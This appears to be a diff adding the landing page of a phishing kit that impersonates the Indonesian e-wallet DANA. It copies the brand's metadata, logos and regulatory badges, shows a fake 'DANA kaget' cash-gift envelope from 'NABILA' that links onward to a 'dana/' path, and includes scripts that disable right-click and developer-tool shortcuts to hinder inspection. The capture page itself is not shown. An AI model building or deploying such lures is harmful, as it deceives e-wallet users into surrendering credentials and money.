@@ -1,0 +1,92 @@
+<head>
+        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <meta name="theme-color" content="#178EE5">
+        <title>DANA - Apa pun transaksinya selalu ada DANA</title>
+        <meta property="og:title" content="DANA - Apa pun transaksinya selalu ada DANA">
+        <meta property="twitter:title" content="DANA - Apa pun transaksinya selalu ada DANA">
+        <meta data-n-head="ssr" data-hid="twitter:image" name="twitter:image" content="https://i.ibb.co/2WFbTBJ/images-16.jpg">
+        <meta data-n-head="ssr" data-hid="og:image" property="og:image" content="https://i.ibb.co/2WFbTBJ/images-16.jpg">
+        <meta data-n-head="ssr" data-hid="og:site_name" name="og:site_name" content="DANA.id">
+        <meta property="og:url" content="https://dana.id">
+        <meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!"><meta property="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
+        <link data-n-head="ssr" rel="icon" type="image/x-icon" href="https://www.dana.id/favicon.ico">
+        <link rel="stylesheet" href="ast/index2.css">
+    </head><body>
+<div class="container_yondahost" style="opacity: 0.406309;">
+
+  <div class="text_amplop">
+    <h4>Tap amplop buat <br> liat DANA kaget</h4>
+  </div>
+  <img onclick="location.href='dana/'" src="https://i.ibb.co.com/LYH65Tn/20240513-122948.png" alt="" class="amplop">
+  <div class="punyadaget">
+      <img src="ast/amplop/img/Nabila.jpg" alt="">
+      <div class="group_text">
+         <h5>Dari</h5>
+         <h3>NABILA</h3>
+      </div>
+  </div>
+</div>
+
+<div sty="" class="start" style="display: none;">
+      <img class="logo" src="ast/img/logoDana.png">
+        <div class="footimg">
+         <img src="ast/img/bi.png" alt="">
+         <img src="ast/img/kom.png" alt="">
+         <p>DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
+      </div>
+    </div>
+
+<script src="https://code.jquery.com/jquery-3.5.1.min.js">
+</script>
+<script src="ast/jquery.mask.min.js"></script>
+
+
+<script>
+window.onload = function()
+{
+        setTimeout(function(){
+            $(".start").fadeIn();
+            setTimeout(function(){
+                $(".start").fadeOut(1000);
+                setTimeout(function(){
+                   $(".container_yondahost").fadeIn(200);
+                   $(".container_yondahost").focus();
+                },1000);
+            },2000);
+        },500);
+}
+</script>
+
+<script>
+    var addHandler = function (element, type, handler) {
+	if (element.addEventListener) {
+		element.addEventListener(type, handler, false);
+	} else if (element.attachEvent) {
+		element.attachEvent("on" + type, handler);
+	} else {
+		element["on" + type] = handler;
+	}
+};
+
+var preventDefault = function (event) {
+	if (event.preventDefault) {
+		event.preventDefault();
+	} else {
+		event.returnValue = false;
+	}
+};
+
+addHandler(window, "contextmenu", function (event) {
+	preventDefault(event);
+});
+
+document.onkeydown = function (event) {
+	if(event.ctrlKey || event.shiftKey || event.keyCode == 123) {
+		return false;
+	}
+};
+</script>
+
+
+</body>
